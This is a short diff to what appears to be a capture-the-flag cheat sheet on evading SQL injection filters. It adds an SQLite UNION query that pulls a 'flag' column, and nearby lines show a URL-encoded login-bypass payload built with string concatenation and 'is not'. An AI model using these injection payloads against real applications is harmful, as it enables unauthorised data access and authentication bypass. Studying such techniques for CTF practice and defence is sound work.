@@ -163,6 +163,13 @@ You can use LIKE, IN or NOT IN instead
 
 ### -- /**/ # blacklisted
 
+In sqlite, queries such as the below seem to work, it ignores the weird empty string, so if it works it works...
+
+```sql
+select * from users where guests = '' UNION 
+SELECT 1, flag, 1,1,1,1 from flag'' LIMIT 25;
+```
+
 `user=ad%27%7C%7C%27min&pass=a%27+is+not+%27b`
 
 `is not`
